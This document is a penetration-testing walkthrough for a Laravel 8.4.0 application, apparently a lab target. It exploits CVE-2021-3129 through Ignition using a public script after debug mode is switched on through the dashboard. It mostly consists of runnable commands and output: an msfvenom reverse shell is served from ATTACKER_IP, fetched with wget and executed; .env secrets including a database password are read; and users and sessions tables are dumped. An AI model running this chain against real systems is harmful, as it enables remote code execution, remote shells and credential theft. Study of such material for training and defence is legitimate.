# Laravel

Laravel apps may expose framework-specific cookies such as `XSRF-TOKEN` and an application session cookie. If `APP_DEBUG` can be enabled, Laravel `8.4.0` can be vulnerable to `CVE-2021-3129` through Ignition.

## Discovery

Useful HTTP indicators:

WhatWeb may show Laravel-style cookies:

```text
Cookies[XSRF-TOKEN,lavita_session]
HttpOnly[lavita_session]
```

Directory enumeration can also find compiled frontend assets and Laravel auth routes:

```bash
feroxbuster -u http://TARGET/ -Eg -t 10 -w /md/wl/raft-small-directories.txt
```

Useful hits:

```text
200  http://TARGET/js/app.js
200  http://TARGET/password/reset
200  http://TARGET/register
405  http://TARGET/logout
200  http://TARGET/login
```

The Laravel version may be exposed on error pages:

```text
http://TARGET/pagenothere
Laravel 8.4.0
```

## Enable Debug Through Dashboard

If registration is open, create an account and log in:

```text
http://TARGET/register
```

After login, the dashboard may expose a debug toggle:

```text
http://TARGET/home
Dashboard Testing Area
for debugging purpose you can turn
APP_DEBUG = [DISABLED]
```

Toggle it to:

```text
APP_DEBUG = [ENABLED]
```

## CVE-2021-3129 Ignition RCE

Use the public CVE-2021-3129 exploit:

```bash
git clone https://github.com/joshuavanderpoll/CVE-2021-3129.git
cd CVE-2021-3129
python3 CVE-2021-3129.py --host http://TARGET --exec id
```

Successful output:

```text
[@] Testing vulnerable URL "http://TARGET/_ignition/execute-solution"...
[√] Host seems vulnerable!
[@] Searching Laravel log file path...
[√] Laravel log path: "/var/www/html/lavita/storage/logs/laravel.log".
[•] Laravel version found: "8.4.0".
[@] Executing command "id"...
[√] Output :
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[√] Working chain found. You have now access to the 'patch' functionality.
```

Stage an ELF reverse shell:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=80 -f elf -o shell.elf
python3 -m http.server 8000
nc -nlvp 80
```

Download, chmod, and execute it through the Laravel RCE:

```bash
python3 CVE-2021-3129.py --host http://TARGET --exec 'wget -O /tmp/shell.elf http://ATTACKER_IP:8000/shell.elf'
python3 CVE-2021-3129.py --host http://TARGET --exec 'chmod 777 /tmp/shell.elf'
python3 CVE-2021-3129.py --host http://TARGET --exec '/tmp/shell.elf'
```

Successful shell context:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux debian 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64 GNU/Linux
```

## Post-Exploitation

Read the Laravel `.env` file:

```bash
cat /var/www/html/lavita/.env
```

Useful values:

```text
APP_NAME=LaVita
APP_ENV=local
APP_KEY=base64:zfXJipTpbCyrZHRDpn0/NmdpHTbAl7/hCMf476EP1LU=
APP_DEBUG=true
APP_URL=http://hb02.onsec
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=lavita
DB_USERNAME=lavita
DB_PASSWORD=sdfquelw0kly9jgbx92
```

Connect to MySQL locally:

```bash
mysql -u lavita -h 127.0.0.1 -p
```

Useful database enumeration:

```sql
use lavita;
show tables;
select * from users;
select * from sessions;
select * from password_resets;
```

## References

- https://github.com/joshuavanderpoll/CVE-2021-3129
- https://github.com/ambionics/phpggc
